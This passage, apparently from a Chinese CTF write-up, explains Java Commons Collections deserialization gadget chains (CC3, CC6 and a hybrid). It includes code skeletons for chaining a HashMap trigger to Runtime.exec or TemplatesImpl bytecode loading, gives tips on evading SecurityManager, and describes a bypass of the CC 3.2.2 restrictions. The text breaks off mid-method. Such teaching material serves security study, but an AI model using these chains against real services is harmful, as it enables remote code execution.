</code></pre><h3 id="常见组件分类" tabindex="-1"><a class="header-anchor" href="#常见组件分类"><span>常见组件分类</span></a></h3><h4 id="_1-触发器-trigger-决定何时执行" tabindex="-1"><a class="header-anchor" href="#_1-触发器-trigger-决定何时执行"><span>1. 触发器（Trigger）- 决定何时执行</span></a></h4><table><thead><tr><th>触发器</th><th>入口方法</th><th>JDK要求</th><th>稳定性</th></tr></thead><tbody><tr><td><strong>HashMap</strong></td><td>readObject() → hash() → hashCode()</td><td>任意版本</td><td>⭐⭐⭐⭐⭐ 最稳定</td></tr><tr><td><strong>PriorityQueue</strong></td><td>readObject() → heapify() → compare()</td><td>任意版本</td><td>⭐⭐⭐⭐</td></tr><tr><td><strong>BadAttributeValueExpException</strong></td><td>readObject() → toString()</td><td>任意版本</td><td>⭐⭐⭐</td></tr><tr><td><strong>AnnotationInvocationHandler</strong></td><td>readObject() → entrySet() → setValue()</td><td>≤JDK 8u71</td><td>⭐⭐ JDK限制</td></tr></tbody></table><h4 id="_2-传递机制-chain-如何传递到目标" tabindex="-1"><a class="header-anchor" href="#_2-传递机制-chain-如何传递到目标"><span>2. 传递机制（Chain）- 如何传递到目标</span></a></h4><table><thead><tr><th>传递机制</th><th>特点</th><th>CC版本要求</th></tr></thead><tbody><tr><td><strong>LazyMap</strong></td><td>延迟加载，访问不存在的key触发</td><td>任意版本</td></tr><tr><td><strong>TransformedMap</strong></td><td>修改value时触发</td><td>任意版本</td></tr><tr><td><strong>ChainedTransformer</strong></td><td>链式调用多个Transformer</td><td>任意版本</td></tr><tr><td><strong>InvokerTransformer</strong></td><td>反射调用方法</td><td>≤3.2.1</td></tr><tr><td><strong>InstantiateTransformer</strong></td><td>反射调用构造器</td><td>≤3.2.1</td></tr><tr><td><strong>ConstantTransformer</strong></td><td>返回常量</td><td>任意版本</td></tr></tbody></table><h4 id="_3-攻击目标-sink-最终执行什么" tabindex="-1"><a class="header-anchor" href="#_3-攻击目标-sink-最终执行什么"><span>3. 攻击目标（Sink）- 最终执行什么</span></a></h4><table><thead><tr><th>攻击目标</th><th>触发方式</th><th>特点</th></tr></thead><tbody><tr><td><strong>Runtime.exec()</strong></td><td>方法调用</td><td>直接但容易被拦截</td></tr><tr><td><strong>TemplatesImpl字节码</strong></td><td>构造器或方法触发</td><td>隐蔽，绕过SecurityManager</td></tr><tr><td><strong>URLClassLoader</strong></td><td>加载远程类</td><td>需要网络访问</td></tr><tr><td><strong>JNDI注入</strong></td><td>lookup()调用</td><td>强大但有JDK版本限制</td></tr></tbody></table><hr><h3 id="拼接三原则" tabindex="-1"><a class="header-anchor" href="#拼接三原则"><span>拼接三原则</span></a></h3><h4 id="原则1-接口匹配" tabindex="-1"><a class="header-anchor" href="#原则1-接口匹配"><span>原则1：接口匹配</span></a></h4><p>触发器必须能调用传递机制的入口方法</p><pre><code class="language-java"><span class="token comment">// ✅ 正确：HashMap.hash() 调用 TiedMapEntry.hashCode()</span>
<span class="token class-name">HashMap</span> → <span class="token class-name">TiedMapEntry</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> → <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// ❌ 错误：HashMap不会调用toString()</span>
<span class="token class-name">HashMap</span> → <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 不匹配！</span>
</code></pre><h4 id="原则2-参数兼容" tabindex="-1"><a class="header-anchor" href="#原则2-参数兼容"><span>原则2：参数兼容</span></a></h4><p>上一步的输出必须是下一步的输入</p><pre><code class="language-java"><span class="token comment">// ✅ 正确：transform()接受Object返回Object，可以链式调用</span>
<span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  → 返回 <span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>
  ↓
<span class="token class-name">InstantiateTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>  → 接受 <span class="token class-name">Class</span> 对象

<span class="token comment">// ❌ 错误：类型不匹配</span>
<span class="token class-name">ConstantTransformer</span> → 返回<span class="token class-name">String</span>
  ↓
<span class="token class-name">InstantiateTransformer</span> → 需要<span class="token class-name">Class</span>对象  <span class="token comment">// 类型不匹配！</span>
</code></pre><h4 id="原则3-版本限制" tabindex="-1"><a class="header-anchor" href="#原则3-版本限制"><span>原则3：版本限制</span></a></h4><p>检查每个组件的可用性</p><pre><code class="language-java"><span class="token comment">// CC 3.2.2 环境</span>
✅ <span class="token class-name">LazyMap</span>、<span class="token class-name">ConstantTransformer</span>、<span class="token class-name">HashMap</span>  <span class="token comment">// 可用</span>
❌ <span class="token class-name">InvokerTransformer</span>、<span class="token class-name">InstantiateTransformer</span>  <span class="token comment">// 被禁用</span>
</code></pre><hr><h3 id="经典组合示例" tabindex="-1"><a class="header-anchor" href="#经典组合示例"><span>经典组合示例</span></a></h3><h4 id="组合1-cc6-hashmap触发-invokertransformer链-runtime-exec" tabindex="-1"><a class="header-anchor" href="#组合1-cc6-hashmap触发-invokertransformer链-runtime-exec"><span>组合1：CC6 = HashMap触发 + InvokerTransformer链 + Runtime.exec()</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] HashMap</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] LazyMap + InvokerTransformer链</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] Runtime.exec()</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// HashMap.readObject() → TiedMapEntry.hashCode() → LazyMap.get() </span>
<span class="token comment">// → ChainedTransformer → Runtime.exec()</span>
</code></pre><h4 id="组合2-cc3-transformedmap触发-instantiatetransformer-templatesimpl" tabindex="-1"><a class="header-anchor" href="#组合2-cc3-transformedmap触发-instantiatetransformer-templatesimpl"><span>组合2：CC3 = TransformedMap触发 + InstantiateTransformer + TemplatesImpl</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] AnnotationInvocationHandler + TransformedMap</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] InstantiateTransformer</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] TemplatesImpl字节码加载</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()</span>
<span class="token comment">// → ChainedTransformer → InstantiateTransformer </span>
<span class="token comment">// → new TrAXFilter(templates) → templates.newTransformer() → 字节码加载</span>
</code></pre><h4 id="组合3-cc6触发-cc3攻击-本项目的cc6triggercc3attack" tabindex="-1"><a class="header-anchor" href="#组合3-cc6触发-cc3攻击-本项目的cc6triggercc3attack"><span>组合3：CC6触发 + CC3攻击（本项目的CC6TriggerCC3Attack）</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] 借用CC6的HashMap触发（更稳定）</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] InstantiateTransformer（CC3的）</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] 借用CC3的TemplatesImpl（更隐蔽）</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// HashMap.readObject() ← CC6的触发</span>
<span class="token comment">//   → TiedMapEntry.hashCode()</span>
<span class="token comment">//   → LazyMap.get()</span>
<span class="token comment">//   → InstantiateTransformer ← CC3的传递</span>
<span class="token comment">//   → new TrAXFilter(templates) ← CC3的攻击目标</span>
<span class="token comment">//   → templates.newTransformer()</span>
</code></pre><p><strong>为什么这样组合？</strong></p><ul><li>CC6的触发方式（HashMap）比CC3（AnnotationInvocationHandler）更稳定</li><li>CC3的攻击目标（TemplatesImpl）比CC6（Runtime.exec）更隐蔽</li></ul><hr><h3 id="实战拼接步骤" tabindex="-1"><a class="header-anchor" href="#实战拼接步骤"><span>实战拼接步骤</span></a></h3><h4 id="步骤1-确定环境约束" tabindex="-1"><a class="header-anchor" href="#步骤1-确定环境约束"><span>步骤1：确定环境约束</span></a></h4><pre><code class="language-java"><span class="token comment">// 检查清单</span>
□ <span class="token constant">JDK</span>版本？
□ <span class="token class-name">Commons</span> <span class="token class-name">Collections</span>版本？
□ 是否有<span class="token class-name">SecurityManager</span>？
□ 是否有其他防护措施？
</code></pre><h4 id="步骤2-选择触发器" tabindex="-1"><a class="header-anchor" href="#步骤2-选择触发器"><span>步骤2：选择触发器</span></a></h4><pre><code class="language-java"><span class="token comment">// 优先级</span>
<span class="token number">1.</span> <span class="token class-name">HashMap</span>（最通用）
<span class="token number">2.</span> <span class="token class-name">PriorityQueue</span>（需要<span class="token class-name">Comparator</span>）
<span class="token number">3.</span> <span class="token class-name">BadAttributeValueExpException</span>（依赖toString）
</code></pre><h4 id="步骤3-选择攻击目标" tabindex="-1"><a class="header-anchor" href="#步骤3-选择攻击目标"><span>步骤3：选择攻击目标</span></a></h4><pre><code class="language-java"><span class="token comment">// 根据环境选择</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>需要绕过<span class="token class-name">SecurityManager</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    使用 <span class="token class-name">TemplatesImpl</span>字节码加载
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>简单直接<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    使用 <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="步骤4-构建传递链" tabindex="-1"><a class="header-anchor" href="#步骤4-构建传递链"><span>步骤4：构建传递链</span></a></h4><pre><code class="language-java"><span class="token comment">// 根据约束选择</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">CC</span>版本 <span class="token operator">&lt;=</span> <span class="token number">3.2</span><span class="token number">.1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    可用 <span class="token class-name">InvokerTransformer</span>、<span class="token class-name">InstantiateTransformer</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    只能用 <span class="token class-name">ConstantTransformer</span> <span class="token operator">+</span> 自定义类（如<span class="token class-name">Myexpect</span>）
<span class="token punctuation">}</span>
</code></pre><h4 id="步骤5-测试验证" tabindex="-1"><a class="header-anchor" href="#步骤5-测试验证"><span>步骤5：测试验证</span></a></h4><pre><code class="language-java"><span class="token comment">// 1. 本地测试序列化</span>
<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 2. 反序列化验证</span>
<span class="token function">deserialize</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 观察是否触发</span>

<span class="token comment">// 3. 调试跟踪</span>
<span class="token comment">// 在关键方法打断点，确认调用链正确</span>
</code></pre><hr><h3 id="拼接核心思路总结" tabindex="-1"><a class="header-anchor" href="#拼接核心思路总结"><span>拼接核心思路总结</span></a></h3><ol><li><strong>模块化思维</strong>：把链分解为触发、传递、攻击三个独立模块</li><li><strong>接口匹配</strong>：确保上下游方法能正确调用</li><li><strong>灵活组合</strong>：取不同链的优点进行组合</li><li><strong>创新绕过</strong>：遇到限制时寻找替代方案</li></ol><p><strong>记住</strong>：反序列化链不是固定的，可以像乐高积木一样自由拼接。关键是理解每个组件的功能和接口，然后根据环境约束进行创新组合。</p><hr><h2 id="从cc3-cc6到mypoc的改造思路" tabindex="-1"><a class="header-anchor" href="#从cc3-cc6到mypoc的改造思路"><span>从CC3/CC6到MyPOC的改造思路</span></a></h2><p>本题目是基于经典的CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。</p><h3 id="cc3链原理-purecc3poc-java" tabindex="-1"><a class="header-anchor" href="#cc3链原理-purecc3poc-java"><span>CC3链原理 (PureCC3POC.java)</span></a></h3><h4 id="核心组件" tabindex="-1"><a class="header-anchor" href="#核心组件"><span>核心组件</span></a></h4><pre><code class="language-java"><span class="token comment">// 使用 InstantiateTransformer 调用构造器</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><h4 id="调用链" tabindex="-1"><a class="header-anchor" href="#调用链"><span>调用链</span></a></h4><pre><code>AnnotationInvocationHandler.readObject()
  → TransformedMap.setValue()
    → ChainedTransformer.transform()
      → ConstantTransformer → 返回TrAXFilter.class
      → InstantiateTransformer.transform()
        → Constructor.newInstance(templates)  // 反射调用构造器
        → new TrAXFilter(templates)
          → templates.newTransformer() → RCE
</code></pre><h4 id="cc-3-2-2失败原因" tabindex="-1"><a class="header-anchor" href="#cc-3-2-2失败原因"><span>CC 3.2.2失败原因</span></a></h4><pre><code class="language-java"><span class="token comment">// InstantiateTransformer.readObject()</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">FunctorUtils</span><span class="token punctuation">.</span><span class="token function">checkUnsafeSerialization</span><span class="token punctuation">(</span><span class="token class-name">InstantiateTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ❌ 抛异常</span>
<span class="token punctuation">}</span>
</code></pre><p>还有AnnotationInvocationHandler在JDK 8u71+后失效，本题目使用的是jdk1.8.0_202</p><hr><h3 id="cc6链原理-purecc6poc-java" tabindex="-1"><a class="header-anchor" href="#cc6链原理-purecc6poc-java"><span>CC6链原理 (PureCC6POC.java)</span></a></h3><h4 id="核心组件-1" tabindex="-1"><a class="header-anchor" href="#核心组件-1"><span>核心组件</span></a></h4><pre><code class="language-java"><span class="token comment">// 使用 InvokerTransformer 直接反射调用方法</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// 获取方法</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token comment">// 调用方法</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>          <span class="token comment">// 执行命令</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 使用 HashMap + TiedMapEntry + LazyMap 触发</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><h4 id="调用链-1" tabindex="-1"><a class="header-anchor" href="#调用链-1"><span>调用链</span></a></h4><pre><code>HashMap.readObject()
  → hash(key)
    → TiedMapEntry.hashCode()
      → getValue()
        → LazyMap.get(key)
          → ChainedTransformer.transform()
            → InvokerTransformer链式调用 → Runtime.exec() → RCE
</code></pre><h4 id="cc-3-2-2失败原因-1" tabindex="-1"><a class="header-anchor" href="#cc-3-2-2失败原因-1"><span>CC 3.2.2失败原因</span></a></h4><pre><code class="language-java"><span class="token comment">// InvokerTransformer.readObject()</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">FunctorUtils</span><span class="token punctuation">.</span><span class="token function">checkUnsafeSerialization</span><span class="token punctuation">(</span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ❌ 抛异常</span>
<span class="token punctuation">}</span>
</code></pre><hr><h3 id="mypoc的改造思路" tabindex="-1"><a class="header-anchor" href="#mypoc的改造思路"><span>MyPOC的改造思路</span></a></h3><h4 id="问题分析" tabindex="-1"><a class="header-anchor" href="#问题分析"><span>问题分析</span></a></h4><p>在CC 3.2.2中，两个关键Transformer被禁用：</p><ul><li>❌ <code>InstantiateTransformer</code> - 不能用来反射调用构造器</li><li>❌ <code>InvokerTransformer</code> - 不能用来反射调用方法</li><li>✅ <code>ConstantTransformer</code> - 只能返回常量，看似无用</li></ul><h4 id="改造策略" tabindex="-1"><a class="header-anchor" href="#改造策略"><span>改造策略</span></a></h4><p><strong>借鉴CC6的触发方式 + 借鉴CC3的攻击目标 + 创新突破点</strong></p><table><thead><tr><th>方面</th><th>CC3</th><th>CC6</th><th>MyPOC (改造版)</th></tr></thead><tbody><tr><td><strong>触发器</strong></td><td>AnnotationInvocationHandler + TransformedMap</td><td>HashMap + TiedMapEntry + LazyMap</td><td>✅ 采用CC6（更稳定）</td></tr><tr><td><strong>攻击目标</strong></td><td>TrAXFilter构造器 → TemplatesImpl</td><td>Runtime.exec()</td><td>✅ 采用CC3（绕过安全管理器）</td></tr><tr><td><strong>核心Transformer</strong></td><td>InstantiateTransformer</td><td>InvokerTransformer</td><td>❌ 都被禁用</td></tr><tr><td><strong>突破方法</strong></td><td>-</td><td>-</td><td>✅ Myexpect + JSONObject</td></tr></tbody></table><h4 id="改造步骤详解" tabindex="-1"><a class="header-anchor" href="#改造步骤详解"><span>改造步骤详解</span></a></h4><p><strong>步骤1: 选择触发链 - 借鉴CC6</strong></p><pre><code class="language-java"><span class="token comment">// MyPOC采用CC6的触发方式（更稳定，JDK通用）</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>✅ <strong>原因</strong>：HashMap.readObject()触发比AnnotationInvocationHandler更稳定</p><p><strong>步骤2: 选择攻击目标 - 借鉴CC3</strong></p><pre><code class="language-java"><span class="token comment">// 目标：调用 new TrAXFilter(templates)</span>
<span class="token class-name">Myexpect</span> myexpect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Myexpect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>✅ <strong>原因</strong>：TemplatesImpl方式不依赖SecurityManager，更通用</p><p><strong>步骤3: 替换危险Transformer - 关键创新</strong></p><p>传统方法（已失效）：</p><pre><code class="language-java">❌ <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span>
   <span class="token comment">// InstantiateTransformer被禁用</span>
</code></pre><p>改造方法（绕过）：</p><pre><code class="language-java"><span class="token comment">// 1. 使用Myexpect替代InstantiateTransformer的功能</span>
<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
